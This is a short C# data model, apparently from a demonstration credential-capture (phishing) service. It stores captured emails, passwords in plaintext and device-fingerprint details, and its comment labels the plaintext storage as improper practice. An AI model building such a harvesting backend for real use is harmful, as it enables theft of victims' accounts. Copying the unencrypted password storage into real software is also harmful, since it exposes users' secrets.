namespace CredentialCaptureService.Models;

/**
 * Data model for captured credentials
 * 
 * Stores: plaintext password, device fingerprint, metadata
 * Shows improper security practice: no encryption, plaintext storage
 */
public class CapturedCredential
{
    public string Id { get; set; } = Guid.NewGuid().ToString();
    
    // Credentials
    public string Email { get; set; } = string.Empty;
    public string Password { get; set; } = string.Empty;  // PLAINTEXT
    
    // Device fingerprint
    public string? SourceIpAddress { get; set; }
    public string? UserAgent { get; set; }
    public string? Timezone { get; set; }
    public string? ScreenResolution { get; set; }
    public string? Language { get; set; }
    public string? Platform { get; set; }
    
    // Metadata
    public DateTime CapturedAt { get; set; } = DateTime.UtcNow;
}
